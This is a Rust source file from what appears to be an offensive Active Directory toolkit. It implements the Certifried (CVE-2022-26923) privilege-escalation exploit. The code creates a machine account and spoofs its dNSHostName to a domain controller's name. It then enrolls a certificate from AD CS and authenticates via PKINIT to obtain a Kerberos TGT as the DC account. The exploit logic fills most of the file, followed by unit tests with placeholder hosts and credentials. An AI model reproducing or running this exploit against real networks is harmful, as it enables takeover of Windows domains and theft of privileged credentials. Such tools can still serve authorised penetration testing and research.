//! Certifried (CVE-2022-26923) -- ADCS privilege escalation via dNSHostName spoofing.
//!
//! Attack flow:
//! 1. Create a new computer account (or reuse an existing one).
//! 2. Overwrite the computer account's `dNSHostName` with a DC's FQDN.
//! 3. Request a certificate; the CA derives the subject/SAN from `dNSHostName`.
//! 4. Use PKINIT to authenticate as the DC account with the issued certificate.
//! 5. Restore the original `dNSHostName`.

use crate::postex::certighost::{CertighostConfig, CertighostError, certighost_auto_enroll};
use crate::proto::ldap::LdapSession;
use crate::proto::pkinit::{PkinitAuthenticator, PkinitConfig};
use rand::distr::SampleString;
use std::fmt;
use thiserror::Error;
use tracing::{info, warn};

/// Configuration for the Certifried attack.
#[derive(Debug, Clone)]
pub struct CertifriedConfig {
    /// CA web enrollment server (FQDN or IP).
    pub ca_url: String,
    /// Target Active Directory domain FQDN.
    pub domain: String,
    /// Domain controller IP address.
    pub dc_ip: String,
    /// Attacker's domain username.
    pub username: String,
    /// Attacker's domain password.
    pub password: String,
    /// FQDN of the domain controller to impersonate.
    pub target_dc_fqdn: String,
    /// Optional computer account name to create (auto-generated if omitted).
    pub computer_name: Option<String>,
    /// Optional password for the created computer account (auto-generated if omitted).
    pub computer_password: Option<String>,
    /// Certificate template to request.
    pub template: String,
    /// Whether to restore the original `dNSHostName` after exploitation.
    pub cleanup: bool,
}

impl Default for CertifriedConfig {
    fn default() -> Self {
        Self {
            ca_url: String::new(),
            domain: String::new(),
            dc_ip: String::new(),
            username: String::new(),
            password: String::new(),
            target_dc_fqdn: String::new(),
            computer_name: None,
            computer_password: None,
            template: "Machine".to_string(),
            cleanup: true,
        }
    }
}

/// Result of a Certifried attack run.
#[derive(Debug, Clone)]
pub struct CertifriedResult {
    /// Whether the attack completed successfully.
    pub success: bool,
    /// Computer account name used or created.
    pub computer_name: String,
    /// Original `dNSHostName` saved for cleanup.
    pub original_dns_hostname: Option<String>,
    /// Issued certificate in DER format.
    pub certificate: Option<Vec<u8>>,
    /// Private key in DER format.
    pub private_key: Option<Vec<u8>>,
    /// TGT (kirbi) blob obtained via PKINIT.
    pub kirbi: Option<Vec<u8>>,
    /// Human-readable status or error message.
    pub message: String,
}

impl fmt::Display for CertifriedResult {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "Certifried: success={}, computer={}, message={}",
            self.success, self.computer_name, self.message
        )
    }
}

/// Errors that can occur during the Certifried attack.
#[derive(Debug, Error)]
pub enum CertifriedError {
    #[error("LDAP error: {0}")]
    LdapError(String),
    #[error("Web enrollment error: {0}")]
    WebEnrollmentError(String),
    #[error("PKINIT error: {0}")]
    PkinitError(String),
    #[error("DNS hostname error: {0}")]
    DnsError(String),
    #[error("Cleanup error: {0}")]
    CleanupError(String),
}

impl From<crate::error::OverthroneError> for CertifriedError {
    fn from(e: crate::error::OverthroneError) -> Self {
        CertifriedError::LdapError(e.to_string())
    }
}

impl From<CertighostError> for CertifriedError {
    fn from(e: CertighostError) -> Self {
        CertifriedError::WebEnrollmentError(e.to_string())
    }
}

fn generate_computer_name() -> String {
    let mut rng = rand::rng();
    format!(
        "OVT{}",
        rand::distr::Alphanumeric.sample_string(&mut rng, 8)
    )
}

fn generate_password() -> String {
    let mut rng = rand::rng();
    format!(
        "Overthrone1!{}",
        rand::distr::Alphanumeric.sample_string(&mut rng, 16)
    )
}

fn dc_account_username(fqdn: &str) -> String {
    fqdn.split('.').next().unwrap_or(fqdn).to_uppercase() + "$"
}

/// Create a new computer account in AD and return its DN.
pub async fn create_computer_account(
    ldap: &mut LdapSession,
    name: &str,
    password: &str,
) -> Result<String, CertifriedError> {
    let dn = ldap.add_computer(name, password, None).await?;
    info!("Certifried: created computer account {dn}");
    Ok(dn)
}

async fn read_dns_hostname(
    ldap: &mut LdapSession,
    computer_dn: &str,
) -> Result<Option<String>, CertifriedError> {
    let filter = format!("(distinguishedName={})", computer_dn.replace(',', "\\,"));
    let entries = ldap.custom_search(&filter, &["dNSHostName"]).await?;
    Ok(entries
        .first()
        .and_then(|e| e.attrs.get("dNSHostName"))
        .and_then(|v| v.first())
        .cloned())
}

async fn set_dns_hostname(
    ldap: &mut LdapSession,
    computer_dn: &str,
    hostname: &str,
) -> Result<(), CertifriedError> {
    ldap.modify_replace(computer_dn, "dNSHostName", hostname.as_bytes())
        .await
        .map_err(|e| CertifriedError::DnsError(format!("failed to set dNSHostName: {e}")))
}

/// Restore the original `dNSHostName`.
pub async fn cleanup_certifried(
    ldap: &mut LdapSession,
    computer_name: &str,
    original_dns: Option<&str>,
) -> Result<(), CertifriedError> {
    let cn = computer_name.trim_end_matches('$');
    let computer_dn = format!("CN={cn},CN=Computers,{}", ldap.base_dn);
    if let Some(dns) = original_dns {
        info!("Certifried cleanup: restoring dNSHostName to {dns}");
        set_dns_hostname(ldap, &computer_dn, dns)
            .await
            .map_err(|e| CertifriedError::CleanupError(format!("restore dNSHostName: {e}")))?;
    } else {
        warn!("Certifried cleanup: no original dNSHostName recorded; skipping restore");
    }
    Ok(())
}

/// Execute the Certifried (CVE-2022-26923) attack end-to-end.
pub async fn exploit_certifried(
    ldap: &mut LdapSession,
    config: &CertifriedConfig,
) -> Result<CertifriedResult, CertifriedError> {
    let computer_name = config
        .computer_name
        .clone()
        .unwrap_or_else(generate_computer_name);
    let computer_password = config
        .computer_password
        .clone()
        .unwrap_or_else(generate_password);
    info!(
        "Certifried: targeting {} using computer account {}",
        config.target_dc_fqdn, computer_name
    );

    let computer_dn = create_computer_account(ldap, &computer_name, &computer_password).await?;
    let original_dns = read_dns_hostname(ldap, &computer_dn).await?;
    set_dns_hostname(ldap, &computer_dn, &config.target_dc_fqdn).await?;

    let cert_config = CertighostConfig {
        ca_server: config.ca_url.clone(),
        ces_url: format!("https://{}/certsrv/certfnsh.asp", config.ca_url),
        use_proxy: false,
        proxy_url: None,
        template: config.template.clone(),
        subject: Some(config.target_dc_fqdn.clone()),
        san: Some(config.target_dc_fqdn.clone()),
        key_size: 2048,
        dry_run: false,
    };

    let cert_result = match certighost_auto_enroll(&cert_config) {
        Ok(r) => r,
        Err(e) => {
            if config.cleanup {
                let _ = cleanup_certifried(ldap, &computer_name, original_dns.as_deref()).await;
            }
            return Err(e.into());
        }
    };

    let certificate = cert_result.certificate.clone().unwrap_or_default();
    let private_key = cert_result.private_key.clone().unwrap_or_default();

    let dc_username = dc_account_username(&config.target_dc_fqdn);
    let pkinit_config = PkinitConfig {
        certificate: certificate.clone(),
        private_key: private_key.clone(),
        realm: config.domain.to_uppercase(),
        username: dc_username.clone(),
        kdc_host: config.dc_ip.clone(),
        check_revocation: false,
        revocation_timeout_secs: 5,
    };

    let pkinit_result = match PkinitAuthenticator::new(pkinit_config).authenticate().await {
        Ok(r) => r,
        Err(e) => {
            if config.cleanup {
                let _ = cleanup_certifried(ldap, &computer_name, original_dns.as_deref()).await;
            }
            return Err(CertifriedError::PkinitError(format!(
                "PKINIT for {dc_username} failed: {e}"
            )));
        }
    };

    if config.cleanup {
        cleanup_certifried(ldap, &computer_name, original_dns.as_deref()).await?;
    }

    Ok(CertifriedResult {
        success: true,
        computer_name: computer_name.clone(),
        original_dns_hostname: original_dns,
        certificate: Some(certificate),
        private_key: Some(private_key),
        kirbi: Some(pkinit_result.tgt),
        message: format!(
            "Certifried succeeded: obtained TGT for {dc_username} via {}",
            config.target_dc_fqdn
        ),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_config_default() {
        let cfg = CertifriedConfig::default();
        assert_eq!(cfg.template, "Machine");
        assert!(cfg.cleanup);
        assert!(cfg.computer_name.is_none());
        assert!(cfg.computer_password.is_none());
    }

    #[test]
    fn test_config_custom() {
        let cfg = CertifriedConfig {
            ca_url: "ca.corp.local".into(),
            domain: "corp.local".into(),
            dc_ip: "10.0.0.10".into(),
            username: "attacker".into(),
            password: "Password123!".into(),
            target_dc_fqdn: "dc01.corp.local".into(),
            computer_name: Some("PWNBOX$".into()),
            computer_password: Some("Secret1!".into()),
            template: "Machine".into(),
            cleanup: false,
        };
        assert_eq!(cfg.ca_url, "ca.corp.local");
        assert!(!cfg.cleanup);
        assert_eq!(cfg.computer_name.as_deref().unwrap(), "PWNBOX$");
    }

    #[test]
    fn test_result_display() {
        let r = CertifriedResult {
            success: true,
            computer_name: "PWNBOX$".into(),
            original_dns_hostname: Some("pwnbox.corp.local".into()),
            certificate: None,
            private_key: None,
            kirbi: None,
            message: "owned".into(),
        };
        let s = format!("{r}");
        assert!(s.contains("PWNBOX$") && s.contains("owned"));
    }

    #[test]
    fn test_error_display() {
        let cases = [
            (
                CertifriedError::LdapError("bind failed".into()),
                "LDAP error: bind failed",
            ),
            (
                CertifriedError::WebEnrollmentError("denied".into()),
                "Web enrollment error: denied",
            ),
            (
                CertifriedError::PkinitError("no tgt".into()),
                "PKINIT error: no tgt",
            ),
            (
                CertifriedError::DnsError("missing".into()),
                "DNS hostname error: missing",
            ),
            (
                CertifriedError::CleanupError("restore".into()),
                "Cleanup error: restore",
            ),
        ];
        for (e, want) in &cases {
            assert_eq!(format!("{e}"), *want);
        }
    }

    #[test]
    fn test_error_debug() {
        let e = CertifriedError::PkinitError("timeout".into());
        let d = format!("{e:?}");
        assert!(d.contains("PkinitError") && d.contains("timeout"));
    }

    #[test]
    fn test_create_computer_name_generation() {
        let name = generate_computer_name();
        assert!(name.starts_with("OVT"));
        assert_eq!(name.len(), 11);
    }

    #[test]
    fn test_cleanup_without_original_dns() {
        let name = "OVTTEST$";
        let cn = name.trim_end_matches('$');
        assert_eq!(cn, "OVTTEST");
    }

    #[test]
    fn test_certifried_error_display() {
        let e = CertifriedError::LdapError("connection refused".into());
        assert_eq!(format!("{e}"), "LDAP error: connection refused");
    }

    #[test]
    fn test_dc_account_username() {
        assert_eq!(dc_account_username("dc01.corp.local"), "DC01$");
    }
}
